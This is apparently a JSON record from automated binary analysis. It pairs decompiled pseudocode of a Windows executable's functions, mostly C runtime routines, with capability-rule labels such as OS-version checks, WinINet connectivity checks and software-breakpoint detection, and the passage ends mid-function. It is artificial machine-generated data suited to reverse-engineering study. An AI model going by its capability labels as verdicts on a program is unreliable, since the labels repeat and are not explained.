{
    "00405169": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405169(uint *param_1)\n\n{\n    *param_1 = 0x401258;\n    if (param_1[2] != 0) {\n        fcn.0040673f(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00403360": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00403360(uint32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uchar auStack56 [4];\n    uint uStack52;\n    uchar auStack48 [48];\n    \n    if (*0x2f55c04 == 3) {\n        uStack52 = 0;\n        fcn.00408e70(auStack48, 0, 0x30);\n        (*_sym.imp.KERNEL32.dll_GetDefaultCommConfigA)(0x402d80, &uStack52, auStack56);\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(0, 0, 0, 0);\n    }\n    *param_1 = param_3 ^ param_2;\n    return;\n}\n",
        "token_count": 174
    },
    "00404750": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl\nfcn.00404750(uint noname_0, uint noname_1, int32_t noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h_00;\n    int32_t arg_10h;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    int32_t var_4h;\n    uint32_t var_ch_3;\n    uint var_ch_2;\n    uint var_10h_2;\n    uint var_10h;\n    uint auStack40 [3];\n    uint var_24h;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_14h;\n    uint var_10h_3;\n    uint var_ch;\n    \n    var_14h = 0x7f9c90;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    puStack20 = &stack0xffffffcc;\n    uVar4 = var_ch_3 | 7;\n    if (uVar4 < 0x7fffffff) {\n        uVar1 = *(var_4h + 0x18);\n        uVar3 = uVar1 >> 1;\n        var_ch_3 = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= 0x7ffffffe - uVar3)) {\n            var_ch_3 = uVar3 + uVar1;\n        }\n    }\n    uVar4 = var_ch_3 + 1;\n    var_10h_3 = 0;\n    if (uVar4 == 0) {\n        uVar4 = 0;\n    }\n    else if (0xffffffff / uVar4 < 2) {\n        uStack24 = 0;\n        fcn.0040509c(&uStack24);\n        auStack40[0] = 0x401200;\n        fcn.00405ceb(auStack40, 0x7fa318);\n        var_10h_3 = CONCAT31(var_10h_3._1_3_, 2);\n        puStack20 = &stack0xffffffc0;\n        fcn.004048d0();\n        return 0x404824;\n    }\n    puStack20 = &stack0xffffffcc;\n    arg_8h_00 = fcn.00405a44(uVar4 * 2);\n    var_10h_3 = 0xffffffff;\n    if (noname_2 != 0) {\n        if (*(var_4h + 0x18) < 8) {\n            arg_10h = var_4h + 4;\n        }\n        else {\n            arg_10h = *(var_4h + 4);\n        }\n        fcn.0040563e(arg_8h_00, var_ch_3 * 2 + 2, arg_10h, noname_2 * 2);\n    }\n    if (7 < *(var_4h + 0x18)) {\n        fcn.0040558d();\n    }\n    *(var_4h + 4) = arg_8h_00;\n    *(var_4h + 0x18) = var_ch_3;\n    *(var_4h + 0x14) = noname_2;\n    puVar2 = var_4h + 4;\n    if (7 < var_ch_3) {\n        puVar2 = arg_8h_00;\n    }\n    *(puVar2 + noname_2 * 2) = 0;\n    *in_FS_OFFSET = uStack16;\n    return puVar2;\n}\n",
        "token_count": 934
    },
    "004048d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004048d0(uint32_t param_1)\n\n{\n    code *pcVar1;\n    uint auStack16 [4];\n    \n    if (param_1 == 0) {\n        param_1 = 0;\n    }\n    else if (0xffffffff / param_1 < 2) {\n        auStack16[0] = 0;\n        fcn.0040509c(auStack16);\n        auStack16[0] = 0x401200;\n        fcn.00405ceb(auStack16, 0x7fa318);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.00405a44(param_1 * 2);\n    return;\n}\n",
        "token_count": 168
    },
    "00405880": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00405973: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00405978)\n// WARNING: Removing unreachable block (ram,0x004059a6)\n// WARNING: Removing unreachable block (ram,0x0040597e)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405880(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004077dc(0x7f9ec0, 0x18);\n    fcn.00406ce2(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x7fe750 != 1) {\n        *0x7fe74c = 1;\n        *0x7fe748 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00408911(*0x2f659b4);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00408911(*0x2f659b0);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00408908();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00408911(*piVar2);\n                        iVar3 = fcn.00408908();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00408911(*0x2f659b4);\n                        piVar1 = fcn.00408911(*0x2f659b0);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.004057ba(0x4011c4);\n        }\n        fcn.004057ba(0x4011cc);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00406c08(8);\n    }\n    return;\n}\n",
        "token_count": 797
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00405e3b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00405e3b(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x405ee6;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00405f12;\n        uStack36 = *0x7fbaac ^ &fcn.00405e3b::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00405e3b::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00408b5d();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.00405e3b::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 729
    },
    "0040612b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040612b(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x7fbaac) {\n        return;\n    }\n    *0x7fee98 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x7fee9c = &arg_8h;\n    *0x7fedd8 = 0x10001;\n    *0x7fed80 = 0xc0000409;\n    *0x7fed84 = 1;\n    var_328h = *0x7fbaac;\n    var_324h = *0x7fbab0;\n    *0x7fed8c = unaff_retaddr;\n    *0x7fee64 = in_GS;\n    *0x7fee68 = in_FS;\n    *0x7fee6c = in_ES;\n    *0x7fee70 = in_DS;\n    *0x7fee74 = unaff_EDI;\n    *0x7fee78 = unaff_ESI;\n    *0x7fee7c = unaff_EBX;\n    *0x7fee80 = in_EDX;\n    *0x7fee84 = in_ECX;\n    *0x7fee88 = in_EAX;\n    *0x7fee8c = unaff_EBP;\n    *0x7fee90 = unaff_retaddr;\n    *0x7fee94 = in_CS;\n    *0x7feea0 = in_SS;\n    *0x7fedd0 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040b21c(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x401b30);\n    if (*0x7fedd0 == 0) {\n        fcn.0040b21c(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 840
    },
    "00409a29": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00409a29(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00406c08(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0040a39d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040a39d(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004077dc(0x7fa0f8, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar3 = fcn.00408b5d();\n    *(iVar3 + 0x90) = *(iVar3 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.004096a9();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar1 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar2 + 8) = iVar5;\n            fcn.0040af60(*(*(iVar1 + 8) + 4 + iVar3), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040a463();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.004096a9();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.00407821();\n    return;\n}\n",
        "token_count": 569
    },
    "0040a463": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040a463(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00408b5d();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00408b5d();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "0040a72b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a72b(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00406079(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00408b5d();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00408b5d();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00406052(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0040a4c3(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 385
    },
    "0040bf0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040bf0b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00408908();\n    var_4h = 0;\n    if (*0x7ff0b0 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x401c2c);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x401c20);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x7ff0b0 = fcn.00408896(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x401c10);\n        *0x7ff0b4 = fcn.00408896(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401bfc);\n        *0x7ff0b8 = fcn.00408896(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401be0);\n        *0x7ff0c0 = fcn.00408896(uVar3);\n        if (*0x7ff0c0 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x401bc8);\n            *0x7ff0bc = fcn.00408896(uVar3);\n        }\n    }\n    if ((*0x7ff0bc != iVar1) && (*0x7ff0c0 != iVar1)) {\n        pcVar4 = fcn.00408911(*0x7ff0bc);\n        pcVar5 = fcn.00408911(*0x7ff0c0);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040c04d;\n        }\n    }\n    if ((((*0x7ff0b4 != iVar1) && (pcVar4 = fcn.00408911(*0x7ff0b4),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x7ff0b8 != iVar1 && (pcVar4 = fcn.00408911(*0x7ff0b8),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040c04d:\n    pcVar4 = fcn.00408911(*0x7ff0b0);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 851
    },
    "0040e3ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e3ce(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7fbaac ^ &stack0xfffffffc;\n    fcn.00405420(arg_10h);\n    var_14h = fcn.0040f3b9(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040e931(&var_10h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040e427:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e467;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040e459:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e467;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040e459;\n        goto code_r0x0040e427;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040e467:\n    fcn.0040612b(unaff_EBX);\n    return;\n}\n",
        "token_count": 501
    },
    "0040e476": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e476(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7fbaac ^ &stack0xfffffffc;\n    fcn.00405420(arg_10h);\n    var_14h = fcn.0040f3b9(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040ee75(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040e4cf:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e50f;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040e501:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e50f;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040e501;\n        goto code_r0x0040e4cf;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040e50f:\n    fcn.0040612b(unaff_EBX);\n    return;\n}\n",
        "token_count": 510
    },
    "0040e931": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e931(uint16_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint32_t *in_stack_00000008;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040ee32;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040ea66;\n                    bVar14 = arg_8h < uVar9;\n                    do 